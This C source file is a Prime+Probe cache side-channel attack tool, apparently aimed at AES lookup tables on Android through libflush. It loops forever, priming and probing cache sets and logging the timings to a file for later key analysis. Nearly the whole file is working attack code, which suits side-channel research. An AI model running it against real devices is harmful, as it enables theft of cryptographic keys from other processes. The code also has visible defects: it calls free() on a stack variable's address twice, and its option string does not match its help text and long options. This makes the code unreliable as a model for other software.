/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include "gaddr.h"
#include "gset.h"
#include <getopt.h>
#include <inttypes.h>
#include <jni.h>
#include <libflush/libflush.h>
#include <malloc.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>


#define BIND_TO_CPU 0
#define BIND_THREAD_TO_CPU 1
#define AES_TABLE_LENGTN 16    // the block num of aes look up table
#define AES_TABLE_SUM 64
#define AES_TABLE_BASE 100
#define CACHE_SET_NUMS 512

#define _STR(x) #x
#define STR(x) _STR(x)


static void print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
  fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu (default: " STR(BIND_TO_CPU) ")\n");
  fprintf(stdout, "\t-b, -base <value>\t Table base set (default: " STR(AES_TABLE_BASE) ")\n");
  fprintf(stdout, "\t-t, -help\t\thelp page\n");
} 
                                                          

int main(int argc, char* argv[]) {
  libflush_session_t *libflush_session;

  /* Define parameters */
  size_t cpu = BIND_TO_CPU;
  size_t thread_cpu = BIND_THREAD_TO_CPU;
  size_t base = AES_TABLE_BASE;

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
  fprintf(stdout, "NUMBER OF CPUS: %zu\n", number_of_cpus);

  static const char* short_options = "t:b:h";
  static struct option long_options[] = {
    {"cpu", required_argument, NULL, 'c'},
    {"base", required_argument, NULL, 'b'},
    {"help", no_argument, NULL, 'h'},
    {NULL, 0, NULL, 0}
  };

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch(c) {
      case 'c':
        cpu = atoi(optarg);
        if (cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", cpu);
          return -1;
        }
        break;
      case 'b':
        base = atoi(optarg);
        if (base >= CACHE_SET_NUMS || base < 0) {
          fprintf(stderr, "Error: base %zu in not available.\n", base);
          return -1;
        }
        break;
      case 'h':
        print_help(argv);
        return 0;
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  /* Bind to CPU */
  cpu = cpu % number_of_cpus;
  thread_cpu = thread_cpu % number_of_cpus;
  if (libflush_bind_to_cpu(cpu) == false) {
    fprintf(stderr, "Warning: Could not bind to CPU: %zu\n", cpu);
  } else {
    fprintf(stdout, "attack process bind to cpu %d\n", cpu);
  }

  /* Initialize libflush */
  libflush_session_args_t args;
  args.bind_to_cpu = thread_cpu;

  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush\n");
    return -1;
  }

  fprintf(stdout, "initialize libflush success!\n");
  fprintf(stdout, "now start asynchronized aes attack\n");

  uint32_t *tmp;
  tmp = (uint32_t *)malloc(AES_TABLE_SUM * sizeof(uint32_t));
  if (tmp == NULL) {
    fprintf(stderr, "ERROR : could not allocate memory to tmp!!\n");
    return -1;
  }
  memset(tmp, 0, AES_TABLE_SUM * sizeof(uint32_t));

  while (true) {
    getTmpTime2(libflush_session, tmp, base);
    usleep(50);
  }

  free(tmp);
  fprintf(stdout, "aes asynchronized attack completed\n");
  return 0;
}

void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
  int base0 = base;
  int base1 = base + 16;
  int base2 = base + 32;
  int base3 = base + 48;
  for (int j = 0; j < AES_TABLE_LENGTN; j++) {
    libflush_prime(libflush_session, base0 + j);
    libflush_prime(libflush_session, base1 + j);
    libflush_prime(libflush_session, base2 + j);
    libflush_prime(libflush_session, base3 + j);
  }
  for (int j = 0; j < AES_TABLE_LENGTN; j++) {
    tmp[j + AES_TABLE_LENGTN * 0] = libflush_probe(libflush_session, base0 + j);
    tmp[j + AES_TABLE_LENGTN * 1] = libflush_probe(libflush_session, base1 + j);
    tmp[j + AES_TABLE_LENGTN * 2] = libflush_probe(libflush_session, base2 + j);
    tmp[j + AES_TABLE_LENGTN * 3] = libflush_probe(libflush_session, base3 + j);
  }
  writeT2TF(tmp);
}

void getTmpTime2(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
  for (int j = 0; j < AES_TABLE_SUM; j++) {
    libflush_prime(libflush_session, base + j);
  }
  for (int j = 0; j < AES_TABLE_SUM; j++) {
    tmp[j] = libflush_probe(libflush_session, base + j);
  }
  writeT2TF(tmp);
}

void getTmpTime3(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
  uint64_t time = 0;
  for (int j = 0; j < AES_TABLE_SUM; j++) {
    libflush_prime(libflush_session, base + j);
    time = libflush_probe(libflush_session, base + j);
    tmp[j] = time;
  }
  writeT2TF(tmp);
}

void writeT2TF(uint32_t *tmp) {
  FILE* file = NULL;
  if ((file = fopen("asyntime", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file ntime!\n");
    return;
  }
  time_t time_stamp;
  struct tm* lt;
  time(&time_stamp);
  lt = localtime(&time_stamp);
  fprintf(file, "%d:%d:%d ", lt->tm_hour, lt->tm_min, lt->tm_sec);
  free(&time_stamp);
  for (int i = 0; i < AES_TABLE_SUM; i++) {
      fprintf(file, "%10zu", tmp[i]);
  }
  fprintf(file, "\n");
  fflush(file);
  fclose(file);
  for (int i = 0; i <AES_TABLE_SUM; i++) {
    tmp[i] = 0;
  }
}

void writeTimeStamp() {
  time_t time_stamp;
  struct tm* lt;
  FILE *file = NULL;
  if ((file = fopen("asyntime", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file ntime!\n");
    return;
  }
  time(&time_stamp);
  lt = localtime(&time_stamp);
  fprintf(file, "%d:%d:%d ", lt->tm_hour, lt->tm_min, lt->tm_sec);
  free(&time_stamp);
  fclose(file);
}
